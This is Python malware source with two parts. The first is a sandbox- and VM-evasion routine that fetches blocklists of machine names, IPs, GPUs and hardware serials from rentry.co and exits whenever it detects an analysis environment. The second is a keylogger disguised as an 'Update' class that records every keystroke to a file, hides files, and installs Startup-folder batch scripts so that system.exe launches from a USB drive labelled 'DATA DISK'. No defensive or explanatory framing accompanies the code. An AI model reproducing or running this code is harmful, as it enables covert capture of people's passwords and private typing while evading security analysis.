def player(): 
 import re
 import uuid
 import wmi
 import requests
 import os
 import ctypes
 import sys
 import subprocess
 import socket

 def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix


 def in_virtualenv():
    return get_base_prefix_compat() != sys.prefix
    
 class Kerpy:
    def registry_check(self):
        cmd = "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\"
        reg1 = subprocess.run(cmd + "DriverDesc", shell=True, stderr=subprocess.DEVNULL)
        reg2 = subprocess.run(cmd + "ProviderName", shell=True, stderr=subprocess.DEVNULL)
        if reg1.returncode == 0 and reg2.returncode == 0:
            print("VMware Registry Detected")
            sys.exit()

    def processes_and_files_check(self):
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    
    
        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            print("VMwareService.exe & VMwareTray.exe process are running")
            sys.exit()
                           
        if os.path.exists(vmware_dll): 
            print("Vmware DLL Detected")
            sys.exit()
            
        if os.path.exists(virtualbox_dll):
            print("VirtualBox DLL Detected")
            sys.exit()
        
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            sys.exit()
        except:
            pass        
        
        processl = requests.get("https://rentry.co/x6g3is75/raw").text
        if processl in processList:
            sys.exit()
            
    def mac_check(self):
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        mac_list = requests.get("https://rentry.co/ty8exwnb/raw").text
        if mac_address[:8] in mac_list:
            print("VMware MAC Address Detected")
            sys.exit()
    def check_pc(self):
     vmname = os.getlogin()
     vm_name = requests.get("https://rentry.co/3wr3rpme/raw").text
     if vmname in vm_name:
         sys.exit()
     vmusername = requests.get("https://rentry.co/bnbaac2d/raw").text
     host_name = socket.gethostname()
     if host_name in vmusername:
         sys.exit()
    def hwid_vm(self):
     current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
     hwid_vm = requests.get("https://rentry.co/fnimmyya/raw").text
     if current_machine_id in hwid_vm:
         sys.exit()
    def checkgpu(self):
     c = wmi.WMI()
     for gpu in c.Win32_DisplayConfiguration():
        GPUm = gpu.Description.strip()
     gpulist = requests.get("https://rentry.co/povewdm6/raw").text
     if GPUm in gpulist:
         sys.exit()
    def check_ip(self):
     ip_list = requests.get("https://rentry.co/hikbicky/raw").text
     reqip = requests.get("https://api.ipify.org/?format=json").json()
     ip = reqip["ip"]
     if ip in ip_list:
         sys.exit()
    def profiles():
     machine_guid = uuid.getnode()
     guid_pc = requests.get("https://rentry.co/882rg6dc/raw").text
     bios_guid = requests.get("https://rentry.co/hxtfvkvq/raw").text
     baseboard_guid = requests.get("https://rentry.co/rkf2g4oo/raw").text
     serial_disk = requests.get("https://rentry.co/rct2f8fc/raw").text
     if machine_guid in guid_pc:
         sys.exit()
     w = wmi.WMI()
     for bios in w.Win32_BIOS():
      bios_check = bios.SerialNumber    
     if bios_check in bios_guid:
         sys.exit() 
     for baseboard in w.Win32_BaseBoard():
         base_check = baseboard.SerialNumber
     if base_check in baseboard_guid:
         sys.exit()
     for disk in w.Win32_DiskDrive():
      disk_serial = disk.SerialNumber
     if disk_serial in serial_disk:
         sys.exit()
 if __name__ == "__main__":
    kerpy = Kerpy()
    kerpy.registry_check()
    kerpy.processes_and_files_check()
    kerpy.mac_check()
    kerpy.check_pc()
    kerpy.hwid_vm()
    kerpy.checkgpu()
    kerpy.check_ip()
    kerpy.profiles()



import os
import getpass
import time
import ctypes
from pynput.keyboard import Key, Listener


class Update:
    def __init__(self):
        self.logger = ""
        self.caps_lock_active = self.is_caps_lock_on()
        self.shift_pressed = False

        if not os.path.exists("log.txt"):
            with open("log.txt", "w", encoding="utf-8") as new_file:
                new_file.write("")

    def is_caps_lock_on(self):
        return ctypes.windll.user32.GetKeyState(0x14) & 1  

    def send_data(self, keystrike):
        self.logger += keystrike
        with open(f"log.txt", "a+", encoding="utf-8") as new_file:
            new_file.write(self.logger)

        self.logger = ""

    def take_keys(self, key):
        self.caps_lock_active = self.is_caps_lock_on()  
        try:
            hit_key = str(key.char)
            if hit_key.isalpha():  
                if self.caps_lock_active ^ self.shift_pressed: 
                    hit_key = hit_key.upper()
                else:
                    hit_key = hit_key.lower()
        except AttributeError:
            if key == Key.space:
                hit_key = " "
            elif key == Key.enter:
                hit_key = "\n"
            elif key == Key.backspace:
                hit_key = "   (BACKSPACE)   "
            elif key == Key.tab:
                hit_key = "    (TAB)    "
            elif key == Key.caps_lock:
                hit_key = "    (CAPS LOCK)    "
            else:
                hit_key = f"    ({str(key)})    "

        self.send_data(hit_key)

    def on_press(self, key):
        if key in (Key.shift, Key.shift_r):
            self.shift_pressed = True
        else:
            self.take_keys(key)

    def on_release(self, key):
        if key in (Key.shift, Key.shift_r):
            self.shift_pressed = False

    def change_dir(self):
        LABEL = "DATA DISK"
        AUTOSTART = "system.exe"
        try:
            username = getpass.getuser()

            startup_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            programs_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs"

            if not os.path.exists(startup_dir):
                os.makedirs(startup_dir)
            if not os.path.exists(programs_dir):
                os.makedirs(programs_dir)

            cmdfile = fr"""
@echo off
start /min cmd /c "{programs_dir}\\sys.bat"
"""
            with open(f'{startup_dir}\\system.bat', "w") as cmdFile1:
                cmdFile1.write(cmdfile)

            with open(f'{programs_dir}\\sys.bat', 'w') as file:
                cmd = fr"""
@echo off
setlocal

set "found=false"

for %%G in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    for /f "tokens=5*" %%A in ('vol %%G: ^| find "Volume in drive"') do (
        if /i "%%B"=="{LABEL}" (
            set "found=true"
            cd /d %%G:\
            attrib +h *.* /s /d
            if exist "script.lock" (
                del "script.lock"
            ) else (
                set "var=true"
            )
            if exist "{AUTOSTART}" (
                start {AUTOSTART}
            ) else (
                exit /b 1
            )
            goto :EOF
        )
    )
)

if "%found%"=="false" (
    exit /b 1
)
"""
                file.write(cmd)

        except Exception as e:
            with open("execdebug.txt", "w") as boh:
                boh.write(f"Batch error: {e}")

    def main(self):
        os.system("attrib +h *.* /s /d")
        listener = Listener(on_press=self.on_press, on_release=self.on_release)

        self.change_dir()
        os.system("attrib +h *.* /s /d")

        time.sleep(0.8)
        os.system("attrib +h *.* /s /d")

        with listener:
            self.logger = ""
            listener.join()


Update().main()
